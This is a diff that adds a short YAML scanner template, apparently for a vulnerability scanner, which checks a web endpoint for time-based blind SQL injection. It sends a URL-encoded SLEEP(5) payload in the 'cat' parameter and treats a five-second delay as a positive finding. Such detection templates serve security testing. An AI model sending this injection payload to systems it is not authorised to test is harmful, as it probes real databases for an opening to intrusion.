@@ -1,0 +1,12 @@
+id: vf-blind-sqli-01
+name: Blind SQL Injection (Time-Based)
+severity: Critical
+category: Injection
+requests:
+  - method: GET
+    path: "/listproducts.php?cat=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)"
+    matchers:
+      logic: AND
+      rules:
+        - type: time_delay
+          seconds: 5
